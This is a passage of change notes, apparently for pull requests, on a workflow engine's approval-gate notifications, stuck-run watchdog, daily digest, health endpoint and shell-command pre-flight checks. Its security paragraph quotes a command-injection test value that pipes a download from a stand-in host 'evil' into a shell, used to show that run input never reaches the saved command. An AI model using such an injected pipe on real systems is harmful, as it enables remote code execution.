  than adding a new one, so older clients would show it in failure tone.

## c-approval-reach — the human gate is not where the pipeline dies

Branch `feat/c-approval-reach`.

### The problem

Three runs of "Entrega contínua · nuria-platform" reached
`revisao → aguardar-humano → aprovacao-merge`. Two were cancelled by hand;
the third waited the full 24 hours, expired as `rejected` (the default
`onExpire`), and `avisar-falha` threw away a finished PR. The approval card
existed in exactly one place — the run panel on the canvas — and the only
signal outside it was a `workflow-approval` notification that opened the
bot's chat, where there was nothing to click.

### What changed

**1. The gate reaches the person, through the mechanisms that already exist**
(`server/workflow-approval-reach.ts` new, pure; `server/workflow-run.ts`;
`server/index.ts`; `server/workflow-api.ts` `workflowApprovalBotId`).

Not a second notification system. Three existing things, joined:

- *The card.* An ordinary option card with a `requestId`, of the durable,
  harness-owned kind a routine proposal or a profile change already uses —
  no provider request behind it. It carries `tool: "workflow_approval"`
  (what makes both clients treat it as an approval: the decision takes over
  the composer on the desktop, and the companion sends allow/deny), the
  options `Approve` / `Deny`, a `workflowApproval: { runId, workflowId,
  nodeId }` payload, the node's prompt, the previous step's summary and a
  `held` note that says since when the gate waits and what expiry will do.
  `requestId` is `workflow-approval:<runId>:<nodeId>:<approvalRequestedAt>`
  — one per OPENING of the gate, so a cycle through the same node gets a
  fresh card and a stale click on the older one cannot settle the newer
  gate. The card is upserted by request id: a reminder or a re-notification
  rewrites the note and appends one text line under it, never a second
  card.
- *Where.* The chat of the bot that ran the LAST agent step before the gate
  (the reviewer whose summary the card quotes), else the entry node's bot,
  else the general notification pick (`workflowApprovalBotId`, a wrapper
  over `workflowNotificationBotId`). Optionally a room —
  `notifyTargetGroupId` on the node — with the same card signed by the
  workflow author, posted with the same store calls a notify node's post
  makes, and the room marked unread. A room that no longer exists is
  logged, never a failure of the gate: the chat copy and the canvas still
  carry the decision.
- *The buzz.* `notifyUser` unchanged: the same `notify` frame every approval
  card sends, which the desktop shows as an OS notification and the iOS
  companion delivers locally (`Session.swift` → `NotificationCoordinator`).
  The bot picked for the frame is the one the card was posted to, so the
  tap lands on the thread that carries the card. The bot is marked unread
  (badge on both clients). The bot is NOT put on `waiting-on-you`: that
  activity derives `busy: true`, which would block every other turn on an
  idle bot; the existing code only sets it on a bot that is already busy.
- *The decision.* Both respond routes (`/api/bots/:id/respond`,
  `/api/threads/:id/respond`) intercept a `workflowApproval` card FIRST and
  call `resolveWorkflowApprovalCard`, which goes through the engine's own
  `resolveApproval` — the canvas's route — so chat, room and canvas write
  the identical receipt. `allow` → `approved`, `deny` → `rejected`, anything
  else 400. The engine's new `approvalReach.settle` hook then marks every
  recorded copy of the card (`answered: "allow" | "deny"`, the marks the
  clients already render), and the route marks the card in its own thread
  regardless. The route answers 200 only when the receipt CARRIES the
  decision (the gate's result, found by its opening instant, since the run
  may have advanced through a notify step in the same call); a
  `resolveApproval` that came back with NO such result — the gate's node
  edited away, which the engine reports through `failNode` rather than a
  throw — closes the card as `unavailable` and answers 409 with the run's
  error. A decision that landed and whose successor then failed in the same
  call (a notify room gone) is still 200 and `answered`: the run's failure
  is the timeline's story, not the card's. A card already answered returns 200 `alreadyAnswered` with what
  happened — the second click is a no-op, never an error. A run that is
  gone, moved on, cancelled or waiting on a LATER opening of the same gate
  closes the card as `unavailable` and answers 409. `closeOpenApprovals` (a
  person interrupting the bot) now skips gate cards, like routine and skill
  cards: the gate is owned by the engine, not by any turn.
- *Scope.* The respond routes are in `CLIENT_ALLOW` (a paired phone answers
  permission cards), but a gate settles what `/api/workflows/*` keeps
  admin-only. `resolveAndSendWorkflowApproval` therefore refuses a gate card
  for a session without `admin` (403 "needs the admin scope"), judged only
  once the card is known to be a gate's, so ordinary cards on the same
  thread are untouched. What a pairing grants by default was checked in
  `server/sessions.ts` `openPairing`: no scopes requested → `[admin,
  client]`; the phone setup flow (`PhoneSetupFlow.tsx`) and `omb pair`
  request none, so the owner's phone is admin; only `omb pair --client`
  mints a client-only session, and that one cannot approve a merge — as it
  could not before. Noted next to the two routes in `request-auth.ts`.
- *The composer stays free.* A gate's card can be open for days (its
  window × its rounds); a card that took over the composer for that long
  would silence the reviewer's chat and the room. `pendingApprovals`
  therefore excludes `workflowApproval` cards on the desktop (composer, call
  views), and the decision is made ON the card: `ApprovalCard` renders
  Approve / Reject inline for an open gate, bound by `ChatView` / `GroupView`
  to the thread's `decideRequest`. On iOS the card already had inline
  buttons; `OptionCard.blocksComposer` (new, `isPending && tool !=
  "workflow_approval"`) replaces `isPending` in `ChatView.hasPendingApproval`,
  and `isRefusal` gains `"reject"` — the wire keeps `Deny` for older builds.
  **The Swift edits (`ios/Sources/CompanionCore/Models.swift`,
  `ios/App/ChatView.swift`, a case in `DecodingTests.swift`) were written
  without a toolchain here and need an Xcode build before shipping.**
- *In a room* the card is signed by the workflow author (`botId:
  "workflow"`), which is no member; `ApprovalCard` shows "A workflow needs
  your decision" for a card so signed (or with no bot), never "Someone's
  workflow".

Engine side: `openApproval` parks the run first (persisted), then
`reachApproval(kind)` — card, then notification, in that order, because the
notification's tap must land on something. The threads that carry the card
are persisted on the run as `approvalThreadIds` the moment they are known,
`[]` included; `settleApproval`, `cancelRun` and `failNode` (a gate edited
away) settle those copies AFTER the receipt is written. A waiting receipt
with NO `approvalThreadIds` — a crash between the park and the post, or a
run that was waiting when the app was upgraded — gets its card (and one
notification) on the next sweep, once. A throwing `announce` is logged and
the gate stays open: the timer, not the card, keeps a run alive.

**2. Expiry that does not discard work** (`shared/workflow.ts`,
`server/workflow-run.ts` `sweepApprovals`).

`onExpire: "approved" | "rejected" | "renotify"`, plus `maxRenotify`
(default 5, 1..30). Under `renotify`, an expired window is RE-ARMED and the
person asked again — card refreshed with "Asked again (n of N)", one text
line in the chat and the room, a fresh `renotify` notification — until the
round count is spent, and only then `rejected` with the summary `expired
without a decision after N re-notifications`. Persisted on the run:
`approvalRenotified` (rounds so far), `approvalRenotifiedAt` (the current
window's start; the expiry and reminder clocks run from
`approvalRenotifiedAt ?? approvalRequestedAt`, while `approvalRequestedAt`
stays the instant the gate OPENED so the receipt's `startedAt` and the
"waiting since" line survive every round), and `approvalNotices` — one
`{ at, kind: "reminder" | "renotify" }` per nudge, copied onto the node's
result as `notices` when the gate settles, so "re-notified 3×, then
approved" is readable after the fact. The re-arm is persisted BEFORE the
reach (a notification that fails is retried by the next round, never by
re-arming every tick). `CLOSED_APPROVAL` is the one place every gate marker
is reset, shared by settle, cancel and terminal failure.

Defaults, deliberately split: a NEW gate from the palette gets
`onExpire: "renotify"` (`createWorkflowNode`,
`WORKFLOW_APPROVAL_ON_EXPIRE_DEFAULT_NEW`); a gate saved WITHOUT the field
keeps the engine's older fallback, `rejected` — existing definitions do not
change behaviour by being loaded.

**3. The halfway reminder** goes through the same reach (card note
refreshed, nudge line, `reminder` notification) — once per WINDOW:
`approvalRemindedAt` resets with every re-notification, so each round gets
its halfway nudge, and each is a `reminder` notice on the receipt. It is
also the safety net for the re-arm: the round count is persisted BEFORE the
re-notification goes out, so a crash (or a throwing `notifyUser`) between
the two loses that one buzz — and the window's halfway reminder, retried
every tick until it is delivered, is the next thing the person hears.

**4. Validation, API, UI, timeline.**

- `validateWorkflow`: `bad-approval-config` (error) for an `onExpire`
  outside the three, a `maxRenotify` outside 1..30 or not whole, a blank
  `notifyTargetGroupId`. `expiresHours` stays `bad-numbers`. The policy is
  not an outcome: `nodeOutcomes` is still `approved` / `rejected`.
- API schema: `onExpire` is a closed enum at the door (an unknown policy is
  a 400, as before); `maxRenotify: optionalNumber`; `notifyTargetGroupId:
  id.optional()`; all three clear on `null`. `SameKeys` drift guard updated.
- Node panel: **On expiry** — `Route to rejected (unset)`, `Ask again, then
  route to rejected`, `Route to approved`, `Route to rejected`; **Ask again
  up to (times)** appears under renotify and is dropped from the document
  when the policy changes; **Also ask in room** — none first, every room, a
  lost room kept visible as `Missing room <id>`. New gates start on
  renotify.
- Chat card (`ApprovalCard`, `PendingApproval`): a `workflowApproval` card
  reads "<bot>'s workflow needs your decision" (in a room, "A workflow needs
  your decision"), decides inline with Approve / Reject on the card — never
  in the composer, which stays free — and records approved / rejected / "no
  longer waiting". en + pt-BR strings.
- Timeline: while waiting, `Waiting for a decision since … · <node> ·
  reminder sent at … · re-notified N× (last at …)`; on a settled gate's
  step, `approvalNoticesLine`: `reminder sent at … · re-notified N× (…)`.
- Persisted data: every new field is optional; runs and workflows saved
  before this load unchanged (a waiting run gets its card on the next tick,
  see above).

### How to test

    pnpm typecheck && pnpm lint
    node_modules/.bin/vitest run server/workflow-approval-reach.test.ts \
      server/workflow-run.test.ts server/workflow.test.ts shared/workflow.test.ts \
      server/workflow-api.test.ts server/workflow-store.test.ts server/auto-approve.test.ts \
      src/state src/lib/workflow-graph.test.ts src/components/WorkflowNodePanel.test.ts \
      src/components/WorkflowRunTimeline.test.ts src/components/ApprovalCard.test.ts \
      server/index.test.ts server/remote-sessions.test.ts

Where each behaviour is pinned:

- `server/workflow-run.test.ts` "WorkflowEngine approval reach" — card
  before notification and `approvalThreadIds` persisted; settle on a canvas
  decision (after the receipt), on rejection, on cancel (`unavailable`), on
  a gate edited away; a throwing announce never blocks the gate and is not
  retried every tick; a waiting receipt with no card gets one on the next
  sweep after a restart, same request id; the reminder refreshes the card
  and lands on the receipt; renotify re-arms the window, asks again, counts
  rounds, resets the reminder per window, rejects after the last round with
  every notice on the result; the default of five rounds and a decision in
  any round keeping its history; a second decision refused with the receipt
  untouched; renotify across a restart (window read from disk); a gate
  without `onExpire` keeps one window then rejected; a cycle through the
  same gate opens a fresh card each time.
- `server/workflow-approval-reach.test.ts` — wording; upsert idempotent on
  request id; room copy signed by the workflow, deleted room tolerated; no
  bot → no threads; answered card left alone; settle marks every copy once
  with the client marks; resolve: not claimed for other cards, allow/deny,
  second click `alreadyAnswered` without reaching the engine, marks its own
  thread even when the engine's settle did not know it, 409 + closed card
  for a run gone / moved on / later opening, engine race, free-text refused.
- `server/index.test.ts` "posts an approval gate's card…" — over the real
  server: chat and room copies, `approvalThreadIds`, decided from the chat
  via `/api/bots/:id/respond`, both copies marked, the room's second answer
  a no-op, the decision log row. `server/remote-sessions.test.ts` — a
  client-only session gets 403 on both respond routes for a gate card and
  the run keeps waiting; a default (admin) pairing decides it.
- `src/components/ApprovalCard.test.ts` — a gate is never a pending
  approval (the composer stays free, an ordinary permission card on the
  same thread still is), inline Approve / Reject only while open and only
  where a decision can be sent, the room copy's header names the workflow.
- `server/workflow-approval-reach.test.ts` — a run back from the engine
  with no gate result is a 409 and a closed card; a decision that landed
  before a synchronous successor failure is 200 and answered; the gate's
  result is found past a notify step.
- `shared/workflow.test.ts` — `bad-approval-config` table, request id;
  `server/workflow-api.test.ts` — schema, persistence, clearing, refused
  start; `workflowApprovalBotId` (last agent step, past notify/wait steps;
  entry; thread owner when the node's bot is gone; general fallback).
- `src/lib/workflow-graph.test.ts` — new gates default to renotify;
  `src/components/WorkflowNodePanel.test.ts` — the three controls;
  `src/components/WorkflowRunTimeline.test.ts` — the waiting line and the
  notices line; `src/components/ApprovalCard.test.ts` — the chat card's
  header, states and spoken form.

Manual check on a fixture (never the live app): a workflow `review (agent)
→ gate (approval, renotify, 1 h, ask in room "Deploys") → merge`. Run it;
within a second the reviewer bot's chat carries the card and the room has a
copy, the desktop banner opens the bot's chat, the phone shows the same
card. Tap Approve on the phone: the run continues, the room's copy shows
"Approved", the canvas panel shows the `approved` step. Run again and wait:
30 min later a reminder, 1 h later "Asked again (1 of 5)", the timeline
says "re-notified 1×".

### Left out, on purpose

- **The refusal option stays "Deny" on the wire.** Companion builds before
  this change map only `deny` / `cancel` / `dismiss` to a refusal and treat
  every other label as consent; a "Reject" option would have APPROVED a
  merge from an un-updated phone. `isRefusal` now also accepts `reject`, but
  the harness keeps sending `Deny` until every paired phone is rebuilt. The
  desktop card labels its own buttons Approve / Reject.
- The Swift changes are unverified here (no toolchain): build the iOS
  target and run `CompanionCoreTests` before shipping the companion.
- Call views (`CallView`, `GroupCallView`) no longer speak a gate aloud,
  since it is not a pending approval; the notification and the card are
  the reach there.
- The bot is not marked `waiting-on-you` (see above): it would mark an idle
  bot busy. The sidebar therefore shows the unread badge, not "Waiting for
  you…".
- One card per gate opening: a re-notification refreshes it and adds a text
  line rather than posting a second card, so an old chat may need a scroll
  to the card — the nudge line says "the card above is still open".
- A person's free-text reply in the chat does not decide the gate; only the
  card's buttons (or the canvas, or the room's card) do.
- The gate's card is not posted for a workflow with no agent node at all
  and no prior thread (nobody to post as); the canvas remains the only
  place, and the run says so in the log.
- No dedicated "renotify" wording on the canvas node card; the node panel
  and the timeline carry it.
- The companion's Live Activity buttons pass through the same allow/deny
  mapping; not verified on a device here.

## e-watchdog — the operator never learns of a stalled pipeline from the sidebar

Branch `feat/e-watchdog`.

### The problem

Three things happened to the live pipeline that nothing announced: a run sat
26 hours on one node; a run spent 48 minutes in three dead attempts on one
node; the app was restarted and the turns died with it. Each was found by a
person opening the app and reading the sidebar. The engine already notified
on a terminal failure and on a cap, but a run that is merely *not moving* had
no voice, a run that finished said nothing, and there was nothing an external
monitor could poll.

### What changed

**1. Run watchdog** (`server/workflow-watch.ts`, `WorkflowEngine.sweepStuck`
in `tick()`, after every sweep that can move a run — so a run this tick just
re-drove or timed out is judged in its new state).

- `Workflow.stuckAfterMinutes?` (default `WORKFLOW_STUCK_AFTER_DEFAULT_MIN`
  = 120, validated whole and in 10..1440 as `bad-numbers`). A live run
  (`running` or `waiting-approval`) whose current node has not changed for
  longer than that is announced with kind `stuck`.
- The clock is a new persisted `WorkflowRun.nodeEnteredAt`, stamped when
  the run is dispatched onto a DIFFERENT node than the receipt names, in
  `advance()` (a node finished — even on a self-loop), on `resumeRun` and on
  a queued run's promotion; never on a re-dispatch of the same node (a
  retry, a park that freed, the fallback hand-off). So "three dead attempts
  on one node" reads as one 48-minute stay. Receipts written before the
  stamp fix their stay at `max(last result end, dispatchedAt, startedAt)` at
  the first dispatch after the upgrade, BEFORE that dispatch overwrites
  `dispatchedAt` — an upgrade under a run that sat a day still reads a day.
- Exemptions: a `wait` node (its timer is its liveness), a run waiting out a
  provider outage (`outage` + `nextAttemptAt`: it has a horizon and two
  announcements of its own), anything not live. **Outage time is not
  counted, and only outage time**: the backoff's end is recorded as
  `outage.waitUntil`; the run is exempt only while that is its pending
  `nextAttemptAt` (`inOutageBackoff`). When the backoff has run out,
  `dispatchDue` re-stamps `nodeEnteredAt`, clears the stuck markers and
  clears `waitUntil` off the outage — whether or not the bot is free — so
  the first tick after a six-hour 404 never calls a run that is moving
  again "stuck", and a bot that stays busy for three hours after a
  one-minute backoff IS announced (the outage record is kept for the
  fallback logic, but the run is now waiting on a bot). A park for a busy
  bot never re-stamps the stay. Both reviewer findings, pinned by test;
  older receipts (no `waitUntil`) are judged, the safe side being to speak. An approval gate is judged
  against its own window: `expiresHours × WORKFLOW_STUCK_APPROVAL_FACTOR`
  (1.5). The expiry sweep settles a gate at its deadline and runs BEFORE the
  watchdog, so in practice a gate only shows as stuck in the health document
  when the sweep could not close it.
- Cadence: `WorkflowRun.stuckNotifiedAt` is persisted only once the
  announcement went out (a throwing `notifyUser` leaves it unset and the
  next tick retries, as the approval reminder does); a further announcement
  goes out at most once per `stuckAfterMinutes` measured from the last one,
  and at most `WORKFLOW_STUCK_ANNOUNCEMENTS_MAX` (12) per stay
  (`run.stuckAnnouncements`) — the twelfth ends with `— last stuck
  announcement for this stay; quiet until the run moves`, and the health
  endpoint keeps listing the run. Both cleared by the same writes that
  stamp `nodeEnteredAt`, and on every terminal write. A restart continues
  the cadence: a run announced at 31 minutes is quiet on the first tick
  after boot and speaks again at 62.
- The sentence: `run stuck at node "ship" for 2h 6m (bot "shipper", attempt
  2 of 3, turn live for 1h 6m) — last step plan: done — Drafted the plan.`
  The activity is what the person would otherwise infer from the timeline:
  `turn live for …`, `next attempt in …`, `waiting for the bot to be free`,
  `waiting for a decision`, `its node is gone from the workflow`.

**2. Every transition announced** — one funnel, `WorkflowEngine.announce(run,
kind, body)`, replacing `safeNotify`. `body` is subject-less; the person's
channel receives `Workflow "<name>" <body>` and the audit room `[<name>]
<body>`, so the line reads the same on the phone and in the room's history.
`WorkflowNotificationKind` gains `completed`, `cancelled`, `stuck`, `outage`,
`fallback`, `digest`; every body names the node and the cause:

| kind | when | body |
| --- | --- | --- |
| `completed` | pure sink reached | `run completed after 7m — last step "ship": shipped — Shipped v2.` |
| `cap-reached` | unchanged | `run completed: execution cap of N bot steps reached before node "X"` |
| `failed` | unchanged wording | `run failed at node "ship": <run.error, denials included>`; missed / refused slots keep `scheduled run …` |
| `cancelled` | `cancelRun`, `cancelQueuedForWebhook` (one per run) | `run cancelled at node "ship"` / `queued run cancelled: <reason>` |
| `approval` / `reminder` | gate opened / half-window | `needs approval at node "gate": <prompt>` / `still needs approval at node "gate" (reminder): <prompt>` |
| `outage` | the FIRST wait of an outage (`outage.attempts` 0 → 1) | `is waiting out a provider outage at node "plan": next attempt in 1m, giving up after 6h — <provider error>` |
| `outage` | horizon spent AND a `failed` edge exists (the run goes on) | `gave up waiting for the provider at node "plan" after 6h (10 attempts): <error> — taking the "failed" edge` |
| `fallback` | node handed to the fallback bot | `handed node "plan" to fallback bot "spare" because: <error>` |
| `stuck` | watchdog | as above |
| `digest` | daily | as below |

Never two notifications for one event: a spent horizon with NO failed edge
is announced once, as the run's `failed` (its reason already says "the
provider stayed unavailable for Xh"). `index.ts` maps kinds to banner titles
(`WORKFLOW_NOTIFY_KIND`): `workflow-failed`, `workflow-approval`, new
`workflow-stuck` ("X's workflow is stuck"), `workflow-done` (completed and
cap-reached, "X's workflow finished") and `workflow-update` (cancelled,
outage, fallback, digest — "X's workflow"); a stuck run opens the node's
task like a failure does. The desktop shows title and body for any kind; the
Android/iOS companions route unknown kinds to their default channel already
(`NotificationMapping.channelId` → `CHANNEL_DONE`, `isBlocking` false), so no
companion change was needed. Item C is not in the base, so `waiting-approval`
stays one notification (no card).

**3. Audit room** — `Workflow.auditGroupId?`. Posted through the same
`postGroupMessage` the notify nodes use (index.ts: `store.appendMessage` on
the room's thread as the "Workflow" author, `unread: true`), scrubbed with
`redactSecretsInText`. A room that no longer exists (`groupExists` says so) is skipped with
one `console.warn` per announcement and the person's notification still
counts as delivered; a post that throws for any other reason is logged the
same way — the audit room is secondary to engine truth and never a reason
to repeat a notification. `auditGroupIssues(workflow, groupExists)` in
`shared/workflow.ts` reports `missing-audit-group` as a **warning** (reviewer
call: the room is a second copy of what the person is told anyway, and a
room somebody deleted must not stop a pipeline built to never stop);
`validateWorkflow` reports a BLANK id under the same code as an error (a
shape mistake). The engine (`groupExists` option, wired to `store.group`)
includes it in `executionIssues` — painted, never a refusal; the API
(`groupExists` dep) paints it in the listing; the renderer judges it live
against `state.groups` in `withLiveIssues`/`liveWorkflowIssues`, so a
`group.deleted` frame repaints the badge. UI: a "Monitoring" block in the schedule panel
(`TriggersPanel` in `WorkflowCanvas.tsx`) with the room select ("Off" first;
a missing room shown disabled, as the notify node panel does).

**4. Daily digest** — `Workflow.digestAt?: "HH:MM"` (local wall clock,
validated as `bad-digest`; refused at the API door like the schedule time).
`sweepDigests` in `tick()`: the slot is the most recent `HH:MM` at or before
now (`digestSlotAt`), computed on the LOCAL CALENDAR — "yesterday at 18:00"
is `setDate(getDate() − 1)` + `setHours`, never `− 24h`: on the DST fall-back
night (America/New_York, 2026-11-01) a 24-hour subtraction lands on Oct 31
19:00, newer than the Oct 31 18:00 that was sent, and the day would go out
twice (reviewer finding; pinned by tests that set `process.env.TZ`, for the
fall-back and the spring-forward day, in the pure suite and through the
engine). The window is `[digestWindowStart(slot), slot)` — the previous
civil day's slot, 25 or 23 hours on a DST day, so no run is counted twice
or missed; the text says "since the previous digest". The digest fires when
the slot is newer than `lastDigestAt` — engine-owned, stripped from clients
like `nextRunAt`, persisted through `WorkflowStore.setLastDigestAt` once the
person's channel took the digest (a throwing wrapper retries next tick); a
restart after a sent digest never sends the day twice, and a crash in the
instant between the send and the write repeats one digest, the better
failure. A digest configured for the
first time anchors at the definition's `updatedAt` and fires at the NEXT
slot, not at once for yesterday. A computer asleep through several slots
sends one digest on waking, for the 24 hours up to the slot it woke into.
`buildDigest` covers the runs that ENDED in `[slot − 24h, slot)`: counts by
status, mean time of the completed ones, the nodes that failed most (a
`failed` edge taken, or the node a failed run stopped on), the denial lines
seen most; a day with nothing still says `no run ended since the previous digest` —
for a 24/7 pipeline, silence and "nothing happened" are different news. It
is announced (`digest`) on the workflow's newest receipt, or a receipt-less
stub for a workflow that never ran, so the same channels carry it. UI: a
checkbox and time input in the Monitoring block.

**5. Health endpoint** — `GET /api/workflows/health`, matched before the
`/api/workflows/:id` verbs (so "health" is never an id), behind the same
session gate as every other workflow route (the public `/api/health` is
untouched). Always 200; `ok` is false while any run is stuck — the monitor's
alert condition, not a broken endpoint. `WorkflowEngine.health()` →
`workflowEngineHealth(...)`, a pure document:

```json
{
  "ok": true, "version": "0.1.61", "now": 1788800000000,
  "engine": { "startedAt": …, "uptimeMs": …, "lastTickAt": … | null },
  "runs": { "live": 1, "queued": 0, "running": 1, "waitingApproval": 0,
            "stuck": [ { "runId", "workflowId", "workflowName", "nodeId", "status",
                         "since", "stuckForMs", "attempt", "lastNotifiedAt" } ] },
  "lastFailure": { "runId", "workflowId", "workflowName", "nodeId", "at", "error" } | null,
  "workflows": [ { "id", "name", "schedule": "daily" | "once" | "interval" | null,
                   "nextRunAt": … | null, "liveRunId", "liveRunStatus", "lastRun": {id,status,endedAt} | null,
                   "lastFailure", "digestAt", "lastDigestAt", "auditGroupId" } ]
}
```

`lastTickAt` is the last COMPLETED reconciler pass: a probe that sees it fall
minutes behind `now` has found a wedged tick. `version` is
`serverVersion()`. Every field is a count, an epoch millisecond or a short
string — never a prompt or a transcript.

### How to test

```
pnpm typecheck && pnpm lint
node_modules/.bin/vitest run server/workflow-watch.test.ts      # the pure rules: stuck verdicts, wording, digest slot and paragraph, health shape
node_modules/.bin/vitest run server/workflow-watchdog.test.ts   # the engine: cadence, retries, restart, old receipts, exemptions, announcements, audit room, digest, health
node_modules/.bin/vitest run server/workflow-run.test.ts server/workflow-outage.test.ts server/workflow-interval.test.ts \
  shared/workflow.test.ts server/workflow-api.test.ts server/workflow-store.test.ts server/auto-approve.test.ts \
  server/notify.test.ts src/state src/lib src/components/Workflow
node_modules/.bin/vitest run server/index.test.ts -t "workflows/health"
```

Every engine test runs on the injected fake clock (`now`) and calls
`tick()` by hand; restarts build a fresh engine + store over the same files.
Existing assertions that pinned "no notification" for a completion, an
outage wait or a hand-off were updated to the new, deliberate one. The
`index.test.ts` health test also sends a forwarded (remote, session-less)
request and expects the gate's refusal, while the public `/api/health` probe
still answers `{ app }`.

Manual check on a fixture: set the patience to 10 minutes on a one-node
workflow whose bot is offline, run it — within eleven minutes the desktop
shows "<bot>'s workflow is stuck" with the node, the bot, "attempt 1 of 3"
and "turn live for 10m"; `curl -s http://127.0.0.1:<port>/api/workflows/health`
(with a session) returns `"ok": false` and the run under `runs.stuck`.

### Left out, on purpose

- No banner for a run STARTING: the brief lists transitions; a start is
  visible on the timeline and would double every scheduled slot's noise.
- The watchdog is quiet during an outage wait even when the stay is past
  the patience: the outage's own two announcements cover it, and a third
  every two hours during a six-hour 404 is spam. The stay restarts when the
  wait ends, so the minutes BEFORE the outage are forgotten too (a run 90
  minutes into a node, then 6 hours of 404, is announced 120 minutes after
  the provider came back, not 30). Accumulating a paused span instead was
  judged not worth a third clock on the receipt.
- The stuck sentence quotes the last RECEIPT line (the previous node's
  result), not the current node's transcript — the engine keeps no
  transcript, and the notification opens the task where it is.
- The digest is per workflow; there is no cross-workflow summary.
- `lastDigestAt` is anchored at `updatedAt` for a first digest, so a canvas
  save at 18:30 on a workflow whose digest was set for 18:00 the same
  afternoon — but that never fired because the app was closed — pushes the
  first digest to the next day. Cosmetic; noted.
- When the person's channel throws, the audit room copy is skipped too
  (`announce` posts the room only after a delivered notification), so a
  retrying reminder, stuck announcement or digest is never re-posted to the
  room on every tick.
- The health endpoint is not exposed on the public (unauthenticated) probe
  path: it names workflows and error strings. A monitor needs a session
  token like any other client.
- The companions' notification channels were not extended (they already
  route unknown kinds); a dedicated "stuck" channel would be an
  Android/iOS change.

## h-preflight — a run does not start in an environment that is not ready

### The problem

Three of the observed failures were knowable before the first bot turn:
a run that finished "empty" because the GitHub token only carried
`read:project`; runs killed by a provider 404 that had been answering 404
since before the trigger; a shared bot busy at the instant of the trigger,
so the run parked and its slot was spent waiting. Each burned 45 minutes
of bot time to learn something a one-second command would have said.

### What changed

**1. Model** (`shared/workflow.ts`). The definition gains

```ts
preflight?: {
  checks: WorkflowPreflightCheck[];
  timeoutSeconds?: number;         // 5..300, default 60 — one deadline for the whole set
}
type WorkflowPreflightCheck =
  | { kind: "command"; name; command: string; cwd?; expectExitCode?: number /* default 0 */; expectStdoutMatch?: string /* regex */ }
  | { kind: "bots-ready"; name; botIds?: string[] }   // absent = every agent node's bot
  | { kind: "engine-health"; name; botId: string };
```

and the run gains `preflight?: { at, ok, checks: [{ name, kind, ok,
durationMs, detail, stdout?, stderr? }] }` (the verdict) plus
`preflightStartedAt?: number` (engine bookkeeping: the flight in progress).
All optional; `workflows.json` / `workflow-runs.json` written before this
load unchanged. `validateWorkflow` refuses, as `bad-preflight` (error
severity, gates execution like every other shape problem): a blank or
repeated check name, an empty command, a blank `cwd`, a fractional exit
code, an invalid regex, a timeout outside 5..300 or not whole, an unknown
kind, a bad `botIds` list, a blank `botId`, and the non-object / non-list
shapes a raw body may carry. The pre-flight is not part of the routing
fingerprint: it gates a start, it steers nothing.

**2. Runner** (`server/workflow-preflight.ts`, pure over three injected
answers). `runWorkflowPreflight(workflow, env)` runs every check in
parallel under one `AbortController` deadline and never rejects:

- `command` → `spawn(command, { shell: true, stdio: ["ignore","pipe","pipe"],
  env: { ...process.env, PATH: augmentedPath() }, cwd })`, its own process
  group on POSIX (`detached`), `windowsHide` on Windows. No TTY, stdin
  closed — a non-interactive `/bin/sh -c`, which is what `gh auth status`,
  `git … status --porcelain`, `curl -sf … -o /dev/null` and a `| grep` need.
  The augmented PATH is the same one the drivers spawn with: a GUI app's
  PATH does not know where `gh` lives. At the deadline the child is killed
  through `killCliTree` (the process group, so a shell's children go too)
  and the check reads `timed out after Ns`. Judged on exit code (expected
  one, default 0), then on `expectStdoutMatch` against the whole stdout
  (`^$` asserts empty). Capture is bounded at 64 KB per stream in memory.
- `bots-ready` → the engine's own `botState`; `missing` and `busy` are
  named per bot, joined with `; `.
- `engine-health` → an injected `engineHealth(botId)` hook. index.ts wires
  it to the registry: the bot's `modelSelection.instanceId`, a shadow entry
  fails with the registry's reason, a live one answers
  `instance.snapshot()` — the drivers' existing `--version` + login-status
  probe (the model picker's health), **no tokens spent** — and fails on
  `state !== "available"` or `authenticated === false`. Without the hook
  (a test engine) the check fails closed with "engine health is not
  available in this build": a check that cannot be performed must not pass.

**Output discipline.** Everything a check prints is passed through
`maskPreflightOutput` — `redactSecretsInText` FIRST (the house scrubber:
`ghp_…`, `github_pat_…`, `sk-…`, `Bearer …`, `xox…`, AKIA, JWTs, PEM
blocks, `token=…` pairs become `«redacted N chars»`), then cut to 500
chars with an ellipsis. Masking before truncation matters: a cut could
otherwise leave a token prefix the scrubber no longer recognises. A hook
or runner that throws is that check's failure, with the message masked.

**3. Execution** (`server/workflow-run.ts`). One new private funnel,
`launch(runId, nodeId)`, replaces the three direct `dispatchNode` calls at
the moments a run's life (re)starts: `startRun` (manual, schedule,
interval, webhook — all four go through it), `resumeRun`, and
`promoteOldestQueued`. With no checks it dispatches at once, exactly as
before. With checks it patches `{ currentNodeId: nodeId, preflightStartedAt:
now }` (no thread, no timer, no dispatchedAt), records an in-process token
in `preflightFlights`, runs the checks, and on the verdict writes
`{ preflight: result, preflightStartedAt: undefined }` in one patch and
then either `dispatchNode(nodeId)` or `failNode(runId, 'pre-flight check
"X" failed: <detail> (and N more)')`.

*Why the run is created and then failed, rather than never created.*
`startRun` is a synchronous contract (the API answers with the run, the
schedule sweep calls it inside a `for`, the webhook path reads its id) and
the checks are asynchronous — child processes. Making `startRun` async
would ripple through four callers and ~140 tests for no gain, because a
scheduled or webhook start has nobody to hand a refusal to anyway: the
receipt IS the answer, and a receipt needs a run. The receipt also carries
the verdict (`run.preflight`) for the timeline, which a refusal-without-a-
run could not. And a restart mid-check must re-run the checks rather than
skip them, which needs the marker persisted on a run. So the refusal is a
`failed` run with `currentNodeId` = the guarded node (entry on a start,
the failed node on a resume), `error` naming the check, `endedAt` = now,
and the ordinary failure notification through `failNode` — the same
channel `recordRefusedRun` uses; `recordRefusedRun` itself stays for the
synchronous refusal (a validation error), which still throws `invalid
workflow:` before any check runs. A manual start therefore answers 201
with a `running` run parked on the entry; the `workflow-run` frame with
the verdict follows within the timeout.

Schedules: a calendar slot refused this way has already been advanced (the
double-fire guard), so the next slot fires normally; an interval trigger
sees the failed run end "now" and re-arms one interval later — the same
backoff item D gave a refused start. Tested for both.

Restart and liveness: `isStranded` now also requires "no live pre-flight
in this process". A run with `preflightStartedAt` set and no token behind
it (the process died mid-check) is stranded, and `recoverStranded` sends it
back through `launch` — the checks run again, the guarded node is never
dispatched on a verdict nobody recorded. While the checks run, ticks do
nothing to the run (`sweepTimeouts` needs `dispatchedAt`). A cancel drops
the token and clears the marker, so a late verdict finds no token and is
discarded; a resume clears the old verdict and the marker and flies afresh.
Queued runs are checked at PROMOTION, against the environment then.

Security: the command string the runner receives is exactly the one the
author saved — no run input, no webhook payload, no template token is ever
folded in (tested with `"; curl evil | sh"` as the run input and
`{{input}} $INPUT` in the command). Commands run as the server's identity,
